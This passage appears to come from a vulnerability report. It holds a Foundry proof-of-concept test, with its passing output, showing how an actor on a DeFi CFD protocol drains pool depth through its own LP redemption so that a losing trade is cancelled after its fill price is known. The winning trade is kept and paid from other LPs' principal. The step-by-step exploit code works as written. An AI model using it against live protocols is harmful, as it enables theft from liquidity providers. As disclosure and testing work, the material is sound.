        _fundSenior(INCUMBENT_SENIOR, SENIOR_ASSETS);
        _setSeniorCapacity(type(uint256).max - 1, 8000);
        _fundTrader(TRADER_A, TRADER_A_FUNDING);
        _fundTrader(TRADER_B, TRADER_B_FUNDING);
        vm.deal(LP_ACCOUNT, 1 ether);
        vm.deal(TRADER_A, 1 ether);
        vm.deal(TRADER_B, 1 ether);
        r.wealthStart = _wealth();

        // 2. Epoch E: the actor refreshes the mark through the router and requests redemption of its whole
        //    junior stake. The request matures for epoch E+1 and is funded by whichever settlement runs then.
        uint256 epochE = engine.lastMarkTime() / 1 hours + 2;
        uint256 t0 = pool.lpEpochStart(epochE) + 120;
        vm.warp(t0);
        vm.roll(block.number + 1);
        _refreshMarkVia(LP_ACCOUNT, FILL_PRICE);
        uint256 actorShares = juniorVault.balanceOf(LP_ACCOUNT);
        vm.prank(LP_ACCOUNT);
        uint256 redeemId = IAsyncTrancheVault(address(juniorVault)).requestRedeem(actorShares, LP_ACCOUNT, LP_ACCOUNT);

        // 3. Epoch E+1, before any settlement: fresh mark, then both legs committed in one block at t1.
        //    Leg B is sized just under the commit-time skew cap 0.4 * netDepth, so that the drain of R
        //    (0.4 * R > legA + headroom) pushes it over the execution-time cap once leg A has filled.
        uint256 t1 = pool.lpEpochStart(epochE + 1) + 10;
        vm.warp(t1);
        vm.roll(block.number + 1);
        _refreshMarkVia(LP_ACCOUNT, FILL_PRICE);
        r.poolAssetsAtCommit = pool.totalAssets();
        r.juniorPrincipalBefore = pool.juniorPrincipal();
        uint256 capAtCommit = (r.poolAssetsAtCommit * 4) / 10; // netDepth * maxSkewRatio, no trader claims
        uint256 legBLots = (capAtCommit - 20_000e6) / 100e6; // 20k USDG under the cap, in 100-USDG lots
        r.legBSize = legBLots * 1e20;
        r.traderABalanceBeforeCommit = clearinghouse.balanceAssets(TRADER_A);
        r.traderBBalanceBeforeCommit = clearinghouse.balanceAssets(TRADER_B);
        uint64 legA = _commit(TRADER_A, _request(CfdTypes.Side.LONG, LEG_A_SIZE, LEG_A_MARGIN, 1, false));
        uint64 legB = _commit(TRADER_B, _request(CfdTypes.Side.SHORT, r.legBSize, TRADER_B_MARGIN, type(uint256).max, false));
        assertEq(router.nextExecuteId(), legA, "leg A must be the FIFO head");

        // 4. The first post-commit tick T is published at t1 + 1 and is the fill price of both legs.
        //    The mark then falls to P (-MOVE_BPS) before the actor acts, inside the execution window.
        bytes[] memory fillData = _stageHistoricalTick(FILL_PRICE, t1 + 1);
        uint256 t2 = t1 + 20;
        vm.warp(t2);
        vm.roll(block.number + 1);

        // 5. Winner first: the actor executes leg A at T (a LONG, in the money once the mark fell to P).
        OrderV3Types.ExecutionResult memory legAResult = _execute(TRADER_A, legA, fillData);
        assertEq(uint8(legAResult.status), uint8(OrderV3Types.LifecycleStatus.Executed), "leg A must fill at T");
        assertEq(_positionSize(TRADER_A), LEG_A_SIZE, "leg A position must be open");

        // 6. Drain: the actor settles the LP epoch with a fresh tick at P. Its matured redemption is funded
        //    out of the pool, so the depth every later open is planned against drops by R.
        _settleLpEpochVia(LP_ACCOUNT, LATER_PRICE);
        r.poolAssetsAfterDrain = pool.totalAssets();
        uint256 fundedShares = IAsyncTrancheVault(address(juniorVault)).claimableRedeemRequest(redeemId, LP_ACCOUNT);
        assertEq(fundedShares, actorShares, "the actor's whole matured redemption must be funded by its own settlement");

        // 7. Loser last: the actor executes leg B at the same fill tick T. The planner re-validates it against
        //    the drained depth: SKEW_TOO_HIGH -> ProtocolStateInvalidated -> terminal PlannerRejected.
        r.legBResult = _execute(TRADER_B, legB, fillData);

        // 8. The actor claims its redemption, closes leg A at P, and both traders withdraw everything.
        vm.prank(LP_ACCOUNT);
        r.redeemedAssets =
            IAsyncTrancheVault(address(juniorVault)).claimRedeem(redeemId, fundedShares, LP_ACCOUNT, LP_ACCOUNT);

        uint256 t3 = t2 + 5;
        vm.warp(t3);
        vm.roll(block.number + 1);
        uint64 closeA = _commit(TRADER_A, _request(CfdTypes.Side.LONG, LEG_A_SIZE, 0, type(uint256).max, true));
        bytes[] memory closeData = _stageHistoricalTick(LATER_PRICE, t3 + 1);
        vm.warp(t3 + 10);
        vm.roll(block.number + 1);
        OrderV3Types.ExecutionResult memory closeResult = _execute(TRADER_A, closeA, closeData);
        assertEq(uint8(closeResult.status), uint8(OrderV3Types.LifecycleStatus.Executed), "leg A close must fill at P");
        assertEq(_positionSize(TRADER_A), 0, "leg A must be fully closed");
        r.traderABalanceAfterClose = clearinghouse.balanceAssets(TRADER_A);

        uint256 traderBBalance = clearinghouse.balanceAssets(TRADER_B);
        vm.prank(TRADER_B);
        clearinghouse.withdrawMargin(traderBBalance);
        uint256 traderABalance = clearinghouse.balanceAssets(TRADER_A);
        vm.prank(TRADER_A);
        clearinghouse.withdrawMargin(traderABalance);
        r.juniorPrincipalAfter = pool.juniorPrincipal();
        r.wealthEnd = _wealth();
    }

    function test_LosingLegCancelledAfterFillPriceKnown_WinnerKept() public {
        Run memory r = _runScenario();

        // A. The losing leg was committed, its fill price T was fixed and public, and it still terminated with
        //    a protocol-state planner rejection (SKEW_TOO_HIGH) caused only by the actor's own redemption funding.
        assertEq(uint8(r.legBResult.status), uint8(OrderV3Types.LifecycleStatus.Failed), "leg B must terminate");
        assertEq(
            uint8(r.legBResult.terminalReason),
            uint8(OrderV3Types.TerminalReason.PlannerRejected),
            "leg B must be a terminal planner rejection, not a pending retry"
        );
        assertEq(_positionSize(TRADER_B), 0, "leg B must never open");
        assertGt(
            r.poolAssetsAtCommit - r.poolAssetsAfterDrain, ACTOR_JUNIOR_ASSETS * 9 / 10, "drain must remove ~R of depth"
        );
        emit log_named_uint("pool depth at commit, USDG", r.poolAssetsAtCommit / 1e6);
        emit log_named_uint("pool depth after the actor's settleLpEpoch, USDG", r.poolAssetsAfterDrain / 1e6);
        emit log_named_uint("leg B notional (SHORT, under the commit-time cap), USDG", (r.legBSize / 1e20) * 100);
        emit log_named_uint("leg A notional (LONG, kept), USDG", LEG_A_LOTS * 100);

        // B. The cancelled leg cost its owner nothing: margin and bounty are back and fully withdrawable.
        assertEq(settlementToken.balanceOf(TRADER_B), TRADER_B_FUNDING, "trader B recovers its full deposit");
        assertEq(clearinghouse.balanceAssets(TRADER_B), 0, "nothing of trader B stays locked");

        // C. The kept leg realized the move P - T minus the two execution fees (and VPI/carry residue).
        uint256 legANotional = LEG_A_LOTS * 100e6;
        uint256 grossMove = (legANotional * MOVE_BPS) / 10_000;
        uint256 feeOpen = (legANotional * 4) / 10_000;
        uint256 feeClose = (((LEG_A_LOTS * LATER_PRICE * 100e6) / 1e8) * 4) / 10_000; // 4 bps of 100-USDG lots at P
        int256 legANet = int256(r.traderABalanceAfterClose) - int256(r.traderABalanceBeforeCommit);
        emit log_named_uint("move between fill tick T and decision, bps", MOVE_BPS);
        emit log_named_uint("gross gain on the kept leg, USDG", grossMove / 1e6);
        emit log_named_uint("execution fees on the kept leg (open + close), USDG", (feeOpen + feeClose) / 1e6);
        emit log_named_int("kept leg net after fees, USDG", legANet / 1e6);
        assertGt(legANet, 0, "the kept leg must be net profitable at this move");
        assertLt(legANet, int256(grossMove), "the kept leg pays the execution fees");

        // D. The actor's combined wealth (LP account + both trader accounts) rose, and the remaining junior
        //    LPs' principal fell: the winner was paid from pool assets with no offsetting losing leg.
        // wealthStart was taken after the LP stake had been converted to shares, so the returned
        // redemption is netted against the stake that funded it (R = ACTOR_JUNIOR_ASSETS).
        int256 actorNet = int256(r.wealthEnd) - int256(r.wealthStart) - int256(ACTOR_JUNIOR_ASSETS);
        emit log_named_uint("redemption claimed by the actor's LP account, USDG", r.redeemedAssets / 1e6);
        emit log_named_int("LP leg: redemption minus the stake that funded it, USDG", (int256(r.redeemedAssets) - int256(ACTOR_JUNIOR_ASSETS)) / 1e6);
        emit log_named_int("actor net across all three accounts, USDG", actorNet / 1e6);
        emit log_named_uint("junior principal before the cycle, USDG", r.juniorPrincipalBefore / 1e6);
        emit log_named_uint("junior principal after the cycle (actor's R removed), USDG", r.juniorPrincipalAfter / 1e6);
        assertGt(actorNet, 0, "cycle must be net profitable for the actor");
        int256 incumbentJuniorChange =
            int256(r.juniorPrincipalAfter) - int256(r.juniorPrincipalBefore) + int256(r.redeemedAssets);
        emit log_named_int("incumbent junior principal change, USDG", incumbentJuniorChange / 1e6);
        assertLt(incumbentJuniorChange, 0, "the remaining LPs must have paid the kept leg");
    }
}
```

Output of the command above at the pinned commit:

```text
Ran 1 test for test/poc/lp-depth-drain-cancels-order/ProofLpRedemptionDrainCancelsLosingLeg.t.sol:ProofLpRedemptionDrainCancelsLosingLeg
[PASS] test_LosingLegCancelledAfterFillPriceKnown_WinnerKept() (gas: 9180690)
Logs:
  pool depth at commit, USDG: 10002000
  pool depth after the actor's settleLpEpoch, USDG: 9602070
  leg B notional (SHORT, under the commit-time cap), USDG: 3980800
  leg A notional (LONG, kept), USDG: 100000
  move between fill tick T and decision, bps: 50
  gross gain on the kept leg, USDG: 500
  execution fees on the kept leg (open + close), USDG: 79
  kept leg net after fees, USDG: 420
  redemption claimed by the actor's LP account, USDG: 399934
  LP leg: redemption minus the stake that funded it, USDG: -65
  actor net across all three accounts, USDG: 354
  junior principal before the cycle, USDG: 4000999
  junior principal after the cycle (actor's R removed), USDG: 3600406
  incumbent junior principal change, USDG: -659

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 18.20ms (11.63ms CPU time)

Ran 1 test suite in 18.90ms (18.20ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

